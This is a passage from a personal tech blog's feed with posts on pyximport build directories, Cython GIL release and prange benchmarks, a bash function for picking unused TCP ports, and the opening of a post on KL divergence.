behind the scene automatically.</p><p >By default, the built shared libaries are placed at <code>~/.pyxbld/</code>, which can be overrided with the <code>build_dir</code> argument of <code>pyximport.install</code>. One may also pass <code>inplace=True</code> to place the libraries sibling to their source files. For example:</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># main.py</span></span><br><span class="line"><span class="hljs-keyword">import</span> pyximport</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># hl: begin</span></span><br><span class="line">pyximport.install(language_level=<span class="hljs-number">3</span>, inplace=<span class="hljs-literal">True</span>)</span><br><span class="line"><span class="hljs-comment"># hl: end</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> foo</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(foo.func(<span class="hljs-number">3</span>))</span><br></pre></div></div><p  class="par"> will generate a <code>.so</code> (or <code>.pyd</code> in Windows) file in the same directory.</p><p >But there’s a problem with inplace building – the extension will not be automatically rebuilt. If you modify the <code>.pyx</code> file and re-run the program, the compilation process will not be triggered. The reason is that Python itself is able to recognize <code>.so</code> or <code>.pyd</code> modules, and their importers have higher priority than customized ones. Thus, if there’s an <code>.so</code> and a <code>.pyx</code> file with same module names reside in the same directory, the <code>.so</code> file will be imported instead of <code>.pyx</code>.</p><p >Therefore, if you want the compiled binaries be placed within your project directory, the best practice is to specify the <code>build_dir</code> argument. By setting <code>build_dir</code> to somewhere inside your project, compiled libraries will be kept within your project directory, but at the same time you can still enjoy the automatic rebuild service.</p><h2 id="references-7">References</h2><ul><li><a href="https://cython.readthedocs.io/en/latest/src/userguide/source_files_and_compilation.html#compiling-with-pyximport">https://cython.readthedocs.io/en/latest/src/userguide/source_files_and_compilation.html#compiling-with-pyximport</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Cython/">Cython</category>
      
      
      <comments>https://i.hsfzxjy.site/cython-auto-reload/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Cython and Threads</title>
      <link>https://i.hsfzxjy.site/cython-and-threads/</link>
      <guid>https://i.hsfzxjy.site/cython-and-threads/</guid>
      <pubDate>Thu, 06 May 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Pure Python &lt;em&gt;sucks&lt;/em&gt; in the scene of parallel computing, due to the existence of the Global Interpreter Lock (aka GIL). GIL preven</description>
        
      
      
      
      <content:encoded><![CDATA[<p >Pure Python <em>sucks</em> in the scene of parallel computing, due to the existence of the Global Interpreter Lock (aka GIL). GIL prevents accessing or manipulating interpreter from different threads concurrently. The mechanism alleviates the risk of race condition, but sequentializes multi-threading program <sup id="fnref:1"><a href="#fn:1">1</a></sup> as well. Sadly, there’s no way to release the lock from pure Python.</p><p >Alright. So what about beyond pure Python? Shall we bypass the mechanism within an extension? The answer is yes, and that’s what most of scientific computing libaries do.</p><p >Cython is a good choice for writing extensions, less verbose, and more similar to Python syntactically. In Cython, one can release GIL temporarily for a code block using the <code>with nogil:</code> syntax. Will it release the true power of multi-core CPU? We should have a try.</p><p >We adopt a toy example, say, a naive matrix multiplication, for benchmarking. Start with a C-only version:</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment">#cython: boundscheck=False</span></span><br><span class="line"><span class="hljs-comment">#cython: wraparound=False</span></span><br><span class="line"><span class="hljs-comment">#cython: nonecheck=False</span></span><br><span class="line"><span class="hljs-comment">#cython: cdivision=True</span></span><br><span class="line"><span class="hljs-comment">#cython: languagelevel=3</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line">cimport numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"></span><br><span class="line">cdef void _matmul(</span><br><span class="line">    np.float_t[:, :] Av,</span><br><span class="line">    np.float_t[:, :] Bv,</span><br><span class="line">    np.float_t[:, :] Cv,</span><br><span class="line">    <span class="hljs-built_in">int</span> M, <span class="hljs-built_in">int</span> N, <span class="hljs-built_in">int</span> P,</span><br><span class="line">) nogil:</span><br><span class="line">    cdef <span class="hljs-built_in">int</span> i, j, k</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(M):</span><br><span class="line">        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(P):</span><br><span class="line">            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):</span><br><span class="line">                Cv[i, j] += Av[i, k] * Bv[k, j]</span><br></pre></div></div><p  class="par"> The function above is straight-forward. We then create a wrapper for it, so that it can be called by Python code:</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">cpdef matmul(</span><br><span class="line">    np.ndarray[dtype=np.float_t, ndim=<span class="hljs-number">2</span>] A,</span><br><span class="line">    np.ndarray[dtype=np.float_t, ndim=<span class="hljs-number">2</span>] B,</span><br><span class="line">    <span class="hljs-built_in">object</span> use_gil,</span><br><span class="line">):</span><br><span class="line">    cdef <span class="hljs-built_in">int</span> M = A.shape[<span class="hljs-number">0</span>]</span><br><span class="line">    cdef <span class="hljs-built_in">int</span> N = A.shape[<span class="hljs-number">1</span>]</span><br><span class="line">    cdef <span class="hljs-built_in">int</span> P = B.shape[<span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">    C = np.zeros((M, P))</span><br><span class="line">    cdef np.float_t[:, :] Av = A, Bv = B, Cv = C</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> use_gil:</span><br><span class="line">        _matmul(Av, Bv, Cv, M, N, P)</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">with</span> nogil:</span><br><span class="line">            _matmul(Av, Bv, Cv, M, N, P)</span><br><span class="line">    <span class="hljs-keyword">return</span> C</span><br></pre></div></div><p  class="par"> Now the Cython part is ready. Below a script for benchmarking:</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">import</span> timeit</span><br><span class="line"><span class="hljs-keyword">import</span> threading</span><br><span class="line"><span class="hljs-keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> pyximport</span><br><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"></span><br><span class="line">pyximport.install(setup_args={<span class="hljs-string">&quot;include_dirs&quot;</span>: np.get_include()}, inplace=<span class="hljs-literal">True</span>, language_level=<span class="hljs-number">3</span>)</span><br><span class="line"><span class="hljs-keyword">import</span> matmul</span><br><span class="line"></span><br><span class="line">N = <span class="hljs-number">1200</span></span><br><span class="line">A = np.random.rand(N, N)</span><br><span class="line">B = np.random.rand(N, N)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">runner</span>(<span class="hljs-params">nthreads: <span class="hljs-built_in">int</span>, use_gil: <span class="hljs-built_in">bool</span></span>) -&gt; <span class="hljs-literal">None</span>:</span><br><span class="line">    args = (A, B, use_gil)</span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nthreads):</span><br><span class="line">        threads.append(threading.Thread(target=matmul.matmul, args=args))</span><br><span class="line">        threads[-<span class="hljs-number">1</span>].start()</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_grid</span>(<span class="hljs-params">**kwargs</span>):</span><br><span class="line">    space = [[(name, v) <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> lst] <span class="hljs-keyword">for</span> name, lst <span class="hljs-keyword">in</span> kwargs.items()]</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>(<span class="hljs-built_in">dict</span>, itertools.product(*space))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> make_grid(</span><br><span class="line">        nthreads=[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>],</span><br><span class="line">        use_gil=[<span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>],</span><br><span class="line">):</span><br><span class="line">    <span class="hljs-built_in">print</span>(kw)</span><br><span class="line">    <span class="hljs-built_in">print</span>(timeit.timeit(<span class="hljs-string">&quot;runner(**kw)&quot;</span>, <span class="hljs-built_in">globals</span>=<span class="hljs-built_in">dict</span>(runner=runner, kw=kw), number=<span class="hljs-number">1</span>))</span><br></pre></div></div><p >Two matrices with a rather large size <code>1200 x 1200</code> are supplied as input, and we test <code>matmul</code> against four settings. The result is listed as below:</p><p  class="noindent"></p><table><thead><tr><th align="center">nthreads</th><th align="center">GIL</th><th align="center">time (s)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">N</td><td align="center">3.47</td></tr><tr><td align="center">1</td><td align="center">Y</td><td align="center">3.51</td></tr><tr><td align="center">2</td><td align="center">N</td><td align="center">3.78</td></tr><tr><td align="center">2</td><td align="center">Y</td><td align="center">6.96</td></tr></tbody></table><p  class="noindent"> The first two rows show that, with single thread, <code>matmul</code> has comparable performance no matter releasing GIL or not. This is desired behavior, since GIL should not lead to performance degradation in single-threading scene. But things change when it comes to multi-threading. With two computing threads running in parallel, the time doubles if holding GIL, whilst in another setting (GIL released), the performance remains unchanged.</p><p  class="noindent"></p><p >We may step further to investigate the behavior of <code>prange</code>. <code>prange</code> is provided by Cython for more convenient parallel computing, adopting the famous OpenMP as backend. Writing a <code>prange</code> version <code>_matmul</code> should take minor modification:</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line">cdef void _matmul_p(</span><br><span class="line">    np.float_t[:, :] Av,</span><br><span class="line">    np.float_t[:, :] Bv,</span><br><span class="line">    np.float_t[:, :] Cv,</span><br><span class="line">    <span class="hljs-built_in">int</span> M, <span class="hljs-built_in">int</span> N, <span class="hljs-built_in">int</span> P,</span><br><span class="line">) nogil:</span><br><span class="line">    cdef <span class="hljs-built_in">int</span> i, j, k, ij</span><br><span class="line"></span><br><span class="line">    cdef <span class="hljs-built_in">int</span> MP = M * P</span><br><span class="line">    <span class="hljs-keyword">for</span> ij <span class="hljs-keyword">in</span> prange(MP, schedule=<span class="hljs-string">&#x27;guided&#x27;</span>):</span><br><span class="line">        i = ij // P</span><br><span class="line">        j = ij % P</span><br><span class="line">        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N):</span><br><span class="line">            Cv[i, j] += Av[i, k] * Bv[k, j]</span><br></pre></div></div><p  class="par"> plus the wrapper <code>matmul</code>:</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line">cpdef matmul(</span><br><span class="line">    np.ndarray[dtype=np.float_t, ndim=<span class="hljs-number">2</span>] A,</span><br><span class="line">    np.ndarray[dtype=np.float_t, ndim=<span class="hljs-number">2</span>] B,</span><br><span class="line">    <span class="hljs-built_in">object</span> use_gil,</span><br><span class="line">    <span class="hljs-comment"># hl: begin</span></span><br><span class="line">    <span class="hljs-built_in">object</span> parallel,</span><br><span class="line">    <span class="hljs-comment"># hl: end</span></span><br><span class="line">):</span><br><span class="line">    cdef <span class="hljs-built_in">int</span> M = A.shape[<span class="hljs-number">0</span>]</span><br><span class="line">    cdef <span class="hljs-built_in">int</span> N = A.shape[<span class="hljs-number">1</span>]</span><br><span class="line">    cdef <span class="hljs-built_in">int</span> P = B.shape[<span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line">    C = np.zeros((M, P))</span><br><span class="line">    cdef np.float_t[:, :] Av = A, Bv = B, Cv = C</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> use_gil:</span><br><span class="line">        <span class="hljs-comment"># hl: begin</span></span><br><span class="line">        <span class="hljs-keyword">if</span> parallel:</span><br><span class="line">            _matmul_p(Av, Bv, Cv, M, N, P)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            _matmul(Av, Bv, Cv, M, N, P)</span><br><span class="line">        <span class="hljs-comment"># hl: end</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-comment"># hl: begin</span></span><br><span class="line">        <span class="hljs-keyword">if</span> parallel:</span><br><span class="line">            _matmul_p(Av, Bv, Cv, M, N, P)</span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            <span class="hljs-keyword">with</span> nogil:</span><br><span class="line">                _matmul(Av, Bv, Cv, M, N, P)</span><br><span class="line">        <span class="hljs-comment">#hl: end</span></span><br><span class="line">    <span class="hljs-keyword">return</span> C</span><br></pre></div></div><p  class="par"> and also, the benchmark script:</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># hl: begin</span></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">runner</span>(<span class="hljs-params">nthreads: <span class="hljs-built_in">int</span>, use_gil: <span class="hljs-built_in">bool</span>, parallel: <span class="hljs-built_in">bool</span></span>) -&gt; <span class="hljs-literal">None</span>:</span><br><span class="line">    args = (A, B, use_gil, parallel)</span><br><span class="line">    <span class="hljs-comment"># hl: end</span></span><br><span class="line">    <span class="hljs-keyword">if</span> nthreads == <span class="hljs-number">0</span>:</span><br><span class="line">        matmul.matmul(*args)</span><br><span class="line">        <span class="hljs-keyword">return</span></span><br><span class="line"></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nthreads):</span><br><span class="line">        threads.append(threading.Thread(target=matmul.matmul, args=args))</span><br><span class="line">        threads[-<span class="hljs-number">1</span>].start()</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> thread <span class="hljs-keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">for</span> kw <span class="hljs-keyword">in</span> make_grid(</span><br><span class="line">        nthreads=[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>],</span><br><span class="line">        use_gil=[<span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>],</span><br><span class="line">        <span class="hljs-comment"># hl: begin</span></span><br><span class="line">        parallel=[<span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>],</span><br><span class="line">        <span class="hljs-comment"># hl: end</span></span><br><span class="line">):</span><br><span class="line">    <span class="hljs-built_in">print</span>(kw)</span><br><span class="line">    <span class="hljs-built_in">print</span>(timeit.timeit(<span class="hljs-string">&quot;runner(**kw)&quot;</span>, <span class="hljs-built_in">globals</span>=<span class="hljs-built_in">dict</span>(runner=runner, kw=kw), number=<span class="hljs-number">1</span>))</span><br></pre></div></div><p  class="par"> OpenMP requires extra compilation flags, so a <code>.pyxbld</code> file is needed:</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># matmul.pyxbld</span></span><br><span class="line"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> Extension</span><br><span class="line"><span class="hljs-keyword">from</span> Cython.Build <span class="hljs-keyword">import</span> cythonize</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_ext</span>(<span class="hljs-params">modname, pyxfilename</span>):</span><br><span class="line">    ext = Extension(</span><br><span class="line">        modname,</span><br><span class="line">        [pyxfilename],</span><br><span class="line">        extra_compile_args=[<span class="hljs-string">&#x27;-fopenmp&#x27;</span>],</span><br><span class="line">        extra_link_args=[<span class="hljs-string">&#x27;-fopenmp&#x27;</span>],</span><br><span class="line">    )</span><br><span class="line">    <span class="hljs-keyword">return</span> cythonize(</span><br><span class="line">        [ext],</span><br><span class="line">        language_level=<span class="hljs-number">3</span>,</span><br><span class="line">        annotate=<span class="hljs-literal">True</span>,</span><br><span class="line">    )[<span class="hljs-number">0</span>]</span><br></pre></div></div><p  class="noindent"></p><table><thead><tr><th align="center">nthreads</th><th align="center">GIL</th><th align="center">time w/o par. (s)</th><th align="center">time w/ par. (s)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">N</td><td align="center">3.47</td><td align="center">0.82</td></tr><tr><td align="center">1</td><td align="center">Y</td><td align="center">3.51</td><td align="center">0.89</td></tr><tr><td align="center">2</td><td align="center">N</td><td align="center">3.78</td><td align="center">1.79</td></tr><tr><td align="center">2</td><td align="center">Y</td><td align="center">6.96</td><td align="center">1.81</td></tr></tbody></table><p >We can see that <code>prange</code> brings an amazing boost in performance! <code>_matmul_p</code> is 3~4x faster in single-threading setting. The number might vary across different hardwares, depending on the number of CPU cores. In the setting of two threads, the running time doubles, which indicates that <code>prange</code> <em>does</em> efficiently use up all available CPU resources.</p><p >We can also notice that, whether to release GIL or not seemingly does not affect <code>prange</code> <sup id="fnref:2"><a href="#fn:2">2</a></sup>. The reason is <code>prange</code> requires GIL to be released, which is automatically done by default.</p><p  class="noindent"></p><blockquote><p  class="noindent"> Cython supports native parallelism through the cython.parallel module. To use this kind of parallelism, the GIL must be released (see Releasing the GIL). It currently supports OpenMP, but later on more backends might be supported. – <em><a href="https://cython.readthedocs.io/en/latest/src/userguide/parallelism.html">Using Parallelism</a></em></p></blockquote><h2 id="conclusion">Conclusion</h2><p ><strong>If there’s no need to hold GIL, just release it.</strong> This happens when you are manipulating some C data structures, and not attempting to disturb the interpreter.</p><p  class="nomargin"> <strong>If there’s massive looping in your Cython code, feel free to accelerate it with <code>prange</code>.</strong> <code>prange</code> will effeciently schedule the computation onto all CPU resources.</p><p  class="nomargin"> <strong>If there’s some macro tasks <sup id="fnref:3"><a href="#fn:3">3</a></sup> which could not be easily parallelized in Cython, schedule them via <code>threading</code> module.</strong> <code>threading</code> sucks for most of the time, but if the tasks not always acquiring GIL, it should be fine just like threads in other languages.</p><div class="footnotes"><ol><li class="footnote" id="fn:1">so that it behaves just like a single-threading version</li><li class="footnote" id="fn:2">0.82s vs 0.89s</li><li class="footnote" id="fn:3">routines consisting of large pieces of logic</li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Cython/">Cython</category>
      
      
      <comments>https://i.hsfzxjy.site/cython-and-threads/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Obtain a Random Available TCP Port with Bash</title>
      <link>https://i.hsfzxjy.site/obtain-a-random-unused-tcp-port-with-bash/</link>
      <guid>https://i.hsfzxjy.site/obtain-a-random-unused-tcp-port-with-bash/</guid>
      <pubDate>Tue, 09 Mar 2021 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;On Linux, we might sometimes want to choose an unused TCP port randomly. This occurs from time to time on a server, when the administrat</description>
        
      
      
      
      <content:encoded><![CDATA[<p >On Linux, we might sometimes want to choose an unused TCP port randomly. This occurs from time to time on a server, when the administrator wants to expose an HTTP port for a user. Or, you just need an available port for IPC. Let’s make it happen with pure bash scripting.</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">unused_port</span></span>() {</span><br><span class="line">    N=<span class="hljs-variable">${1:-1}</span></span><br><span class="line">    <span class="hljs-built_in">comm</span> -23 \</span><br><span class="line">        &lt;(<span class="hljs-built_in">seq</span> <span class="hljs-string">&quot;1025&quot;</span> <span class="hljs-string">&quot;65535&quot;</span> | <span class="hljs-built_in">sort</span>) \</span><br><span class="line">        &lt;(ss -Htan |</span><br><span class="line">            awk <span class="hljs-string">&#x27;{print $4}&#x27;</span> |</span><br><span class="line">            <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f2 |</span><br><span class="line">            <span class="hljs-built_in">sort</span> -u) |</span><br><span class="line">        <span class="hljs-built_in">shuf</span> |</span><br><span class="line">        <span class="hljs-built_in">head</span> -n <span class="hljs-string">&quot;<span class="hljs-variable">$N</span>&quot;</span></span><br><span class="line">}</span><br></pre></div></div><p  class="par"> We would take apart the function step by step in the following paragraphs.</p><p  class="noindent"></p><p >Tirst step is to obtain a list of occupied ports, which can be accomplished by command</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">ss -Htan</span><br></pre></div></div><p  class="par"> <code>ss</code> is a tool for investigating sockets, which prints out ports currently used in the form of a table:</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">State        Recv-Q   Send-Q                               Local Address:Port                              Peer Address:Port               Process</span><br><span class="line">ESTAB        0        0                                        127.0.0.1:45342                                127.0.0.1:1081</span><br><span class="line">...</span><br></pre></div></div><p  class="par"> Argument <code>-Htan</code> controls the printing style of <code>ss</code>. <code>-H</code> removes table header; <code>-t</code> lists only TCP ports; <code>-a</code> lists all ports, including listening and unlistening ones; <code>-n</code> enforces ports to be printed numerically <sup id="fnref:1"><a href="#fn:1">1</a></sup>. The command produces an output like:</p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line">LISTEN       0        128                                        0.0.0.0:17500                                            0.0.0.0:*</span><br><span class="line">LISTEN       0        128                                      127.0.0.1:17600                                            0.0.0.0:*</span><br></pre></div></div><p  class="par"> We then use some string manipulation tools to extract the port numbers:</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line">ss -Htan |</span><br><span class="line"><span class="hljs-comment"># hl: begin</span></span><br><span class="line">    awk <span class="hljs-string">&#x27;{print $4}&#x27;</span> |</span><br><span class="line">    <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f2 |</span><br><span class="line">    <span class="hljs-built_in">sort</span> -u</span><br><span class="line"><span class="hljs-comment"># hl: end</span></span><br></pre></div></div><p  class="par"> Here, <code>awk &#39;&#123;print $4&#125;&#39;</code> selects the 4th item (e.g., <code>0.0.0.0:17500</code>) from each line. <code>cut -d&#39;:&#39; -f2</code> splits each item with <code>:</code> and prints out the second part (e.g., <code>17500</code>). <code>sort -u</code> sorts the items and removes duplicated ones.</p><p >Now we’ve got the list of unavailable ports. We might name it as <code>LIST2</code> for simplicity. The next step is to create another list <code>LIST1</code> by “inversing” <code>LIST2</code>. By “inversing” we mean <code>LIST1</code> (disjointly) unioning <code>LIST2</code> would be equal to <code>FULLLIST</code> (all legal ports).</p><p  class="nomargin"> <code>FULLLIST</code> can be obtained easily with <code>seq &quot;1025&quot; &quot;65535&quot; | sort</code>. The “inverse” operation, meanwhile, can be achieved using <code>comm</code>.</p><blockquote><p  class="noindent"> Simply, <code>comm</code> takes two files <code>FILE1</code> and <code>FILE2</code> as input, and produces output with three columns:</p><ul><li>Column 1 contains lines unique to <code>FILE1</code>;</li><li>Column 2 contains lines unique to <code>FILE2</code>;</li><li>Column 3 contains lines common to both files.</li></ul></blockquote><p  class="par"> Apparently we only needs the first column, so use <code>-23</code> to suppress the other two ones. Put them together as:</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"><span class="hljs-built_in">comm</span> -23 \</span><br><span class="line">    &lt;(<span class="hljs-built_in">seq</span> <span class="hljs-string">&quot;1025&quot;</span> <span class="hljs-string">&quot;65535&quot;</span> | <span class="hljs-built_in">sort</span>) \</span><br><span class="line">    &lt;(ss -Htan |</span><br><span class="line">        awk <span class="hljs-string">&#x27;{print $4}&#x27;</span> |</span><br><span class="line">        <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f2 |</span><br><span class="line">        <span class="hljs-built_in">sort</span> -u)</span><br></pre></div></div><p  class="par"> The syntax <code>&lt;(command)</code> is known as <strong>process substitution</strong>. It is equivalent to:</p><ul><li>Spawn <code>command</code> <em>in current shell</em> and pipe its stdout to <code>/dev/fd/&lt;some number&gt;</code>;</li><li>Substitute <code>&lt;(...)</code> with <code>/dev/fd/&lt;some number&gt;</code>.</li></ul><p >The last step, we further incorporate the command into a convenient function.</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment"># hl: begin</span></span><br><span class="line"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">unused_port</span></span>() {</span><br><span class="line">    N=<span class="hljs-variable">${1:-1}</span></span><br><span class="line"><span class="hljs-comment"># hl: end</span></span><br><span class="line">    <span class="hljs-built_in">comm</span> -23 \</span><br><span class="line">        &lt;(<span class="hljs-built_in">seq</span> <span class="hljs-string">&quot;1025&quot;</span> <span class="hljs-string">&quot;65535&quot;</span> | <span class="hljs-built_in">sort</span>) \</span><br><span class="line">        &lt;(ss -Htan |</span><br><span class="line">            awk <span class="hljs-string">&#x27;{print $4}&#x27;</span> |</span><br><span class="line">            <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f2 |</span><br><span class="line">            <span class="hljs-built_in">sort</span> -u) |</span><br><span class="line">        <span class="hljs-comment"># hl: begin</span></span><br><span class="line">        <span class="hljs-built_in">shuf</span> |</span><br><span class="line">        <span class="hljs-built_in">head</span> -n <span class="hljs-string">&quot;<span class="hljs-variable">$N</span>&quot;</span></span><br><span class="line">        <span class="hljs-comment"># hl: end</span></span><br><span class="line">}</span><br></pre></div></div><p  class="par"> The function receives an argument <code>N</code>, shuffles the available port numbers, and choose <code>N</code> ports from the list.</p><p  class="noindent"> Code is available at <a href="https://github.com/hsfzxjy/bashi/blob/master/functions/unused_port.sh">hsfzxjy/bashi</a> on Github.</p><h1 id="references-5">References</h1><ul><li><a href="https://unix.stackexchange.com/a/423052/353147">https://unix.stackexchange.com/a/423052/353147</a></li><li><a href="https://tldp.org/LDP/abs/html/process-sub.html">https://tldp.org/LDP/abs/html/process-sub.html</a></li></ul><div class="footnotes"><ol><li class="footnote" id="fn:1">Otherwise, some ports would be resolved into their service names, such as <code>80</code> into <code>http</code></li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Linux/">Linux</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Bash/">Bash</category>
      
      
      <comments>https://i.hsfzxjy.site/obtain-a-random-unused-tcp-port-with-bash/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Information Theory: KL Divergence</title>
      <link>https://i.hsfzxjy.site/information-theory-kl-divergence/</link>
      <guid>https://i.hsfzxjy.site/information-theory-kl-divergence/</guid>
      <pubDate>Tue, 14 Jan 2020 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Assume there are two hypotheses $H_1$ and $H_2$, r.v. $X$ ranged in alphabets $&#92;{a_1,&#92;ldots&#92;,a_k&#92;}$. Under hypothesis $H_i$, $X$ has pdf</description>
        
      
      
      
      <content:encoded><![CDATA[<p >Assume there are two hypotheses $H_1$ and $H_2$, r.v. $X$ ranged in alphabets $\{a_1,\ldots\,a_k\}$. Under hypothesis $H_i$, $X$ has pdf $p(X=a_j|H_i)=p_i(a_j)$. According to Law of Total Probability, we have:</p><p >$$ p(H_i|a_k) = \frac{p(H_i)p_i(a_k)}{p_1(a_k)p(H_1)+p_2(a_k)p(H_2)} $$</p><p  class="par"> The formula can be transformed into:</p><p >$$ \log \frac{p_2(a_k)}{p_1(a_k)} = \log \frac{p(H_2|a_k)}{p(H_1|a_k)} - \log \frac{p(H_2)}{p(H_1)} $$</p><p  class="par"> which implies that, $\log \frac{p_2(a_k)}{p_1(a_k)}$ equals the difference of log likelihood ratio before and after conditioning $X=a_k$. We define $\log \frac{p_2(a_k)}{p_1(a_k)}$ be the discrimination information for $H_2$ over $H_1$, when $X=a_k$. The expectation of discrimination information is KL divergence, denoted as:</p><p >$$D_{KL}(P_2||P_1) = \sum_k p_2(a_k) \log \frac{p_2(a_k)}{p_1(a_k)} $$</p><p  class="par"> which sometimes denoted as $I(p2,p1;X)$, or simply $I(p2,p1)$ if without ambiguity.</p><p >KL Divergence can be interpreted as a measure of expected information for $X$ gained after distribution shifted from $p_1$ to $p_2$, where $p_1$ and $p_2$ regarded as prior and post-prior distributions. </p><p  class="par"> Further we may define the (symmetrised) divergence between $p_2$ and $p_1$:</p><p >$$J(p_2,p_1;X)=D_{KL}(p_2||p_1) + D_{KL}(p_1||p_2) = J(p_1,p_2;X)$$</p><p  class="par"> Divergence $J(p_2,p_1)$ is a measure of difference between two distributions satisfying</p><ul><li>$J(p_1,p_2) \geq 0$ and equality holds iff $p_1=p_2$;</li><li>$J(p_1,p_2) = J(p_2,p_1)$.</li></ul><p  class="par"> but not triangle inequality, and thus $J(\cdot,\cdot)$ is not a distance function.</p><h2 id="generalization">Generalization</h2><p  class="par"> We may generalize the definition to continuous variables as:</p><p >$$D_{KL}(p_2||p_1) = \int p_2(x) \log \frac{p_2(x)}{p_1(x)} dx$$</p><p  class="par"> or multivariate cases:</p><p >$$D_{KL}(p_2(\vec{x})||p_1(\vec{x})) = \int p_2(\vec{x}) \log \frac{p_2(\vec{x})}{p_1(\vec{x})} d\vec{x}$$</p><p  class="par"> or further, conditional cases:</p><p 